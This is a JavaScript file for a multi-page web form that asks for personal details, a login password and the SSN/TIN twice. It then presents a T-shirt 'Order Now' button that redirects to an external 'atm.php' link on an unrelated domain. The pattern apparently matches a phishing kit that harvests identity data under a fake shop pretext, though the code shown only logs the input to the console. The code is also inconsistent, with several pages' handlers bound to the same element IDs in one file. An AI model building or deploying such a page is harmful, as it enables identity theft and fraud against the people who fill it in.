document.getElementById('nextPage').addEventListener('click', function() {
  const form = document.getElementById('personalInfoForm');
  const formData = new FormData(form);

  // Log the user input to console (or save to localStorage)
  for (let [key, value] of formData.entries()) {
    console.log(`${key}: ${value}`);
  }

  // Redirect to Page 2
  window.location.href = 'page2.html';
});
// For Page 2: Previous and Next Buttons
document.getElementById('prevPage').addEventListener('click', function() {
  window.location.href = 'index.html';
});

document.getElementById('nextPage').addEventListener('click', function() {
  const form = document.getElementById('loginForm');
  const formData = new FormData(form);

  // Validate password confirmation
  const password = formData.get('password');
  const confirmPassword = formData.get('confirmPassword');

  if (password !== confirmPassword) {
    alert('Passwords do not match!');
    return;
  }

  // Log the user input to console (or save to localStorage)
  for (let [key, value] of formData.entries()) {
    console.log(`${key}: ${value}`);
  }

  // Redirect to Page 3
  window.location.href = 'page3.html';
});
// For Page 3: Previous and Next Buttons
document.getElementById('prevPage')?.addEventListener('click', function() {
  window.location.href = 'page2.html';
});

document.getElementById('nextPage')?.addEventListener('click', function() {
  const form = document.getElementById('identityForm');
  const formData = new FormData(form);

  const ssn = formData.get('ssn');
  const confirmSSN = formData.get('confirmSSN');

  if (ssn !== confirmSSN) {
    alert('SSN/TINs do not match!');
    return;
  }

  for (let [key, value] of formData.entries()) {
    console.log(`${key}: ${value}`);
  }

  window.location.href = 'page4.html';
});
// For Page 4: Previous and Next Buttons
document.getElementById('prevPage')?.addEventListener('click', function() {
  window.location.href = 'page3.html';
});

document.getElementById('nextPage')?.addEventListener('click', function() {
  const form = document.getElementById('ssnForm');
  const formData = new FormData(form);

  const ssn = formData.get('ssn');
  const confirmSSN = formData.get('confirmSSN');

  if (ssn !== confirmSSN) {
    alert('SSN/TINs do not match!');
    return;
  }

  for (let [key, value] of formData.entries()) {
    console.log(`${key}: ${value}`);
  }

  window.location.href = 'page5.html';
});
// For Page 5: Previous Button
document.getElementById('prevPage')?.addEventListener('click', function() {
  window.location.href = 'page4.html';
});

// For "Order Now" Button
document.getElementById('orderButton')?.addEventListener('click', function() {
  const tshirtSize = document.getElementById('tshirtSize').value;
  console.log(`T-Shirt Size: ${tshirtSize}`);

  // Redirect to the external link with the selected size
  window.location.href = 'https://hiddenlink.com.ng/atm.php?user=99940&ref=99940';
});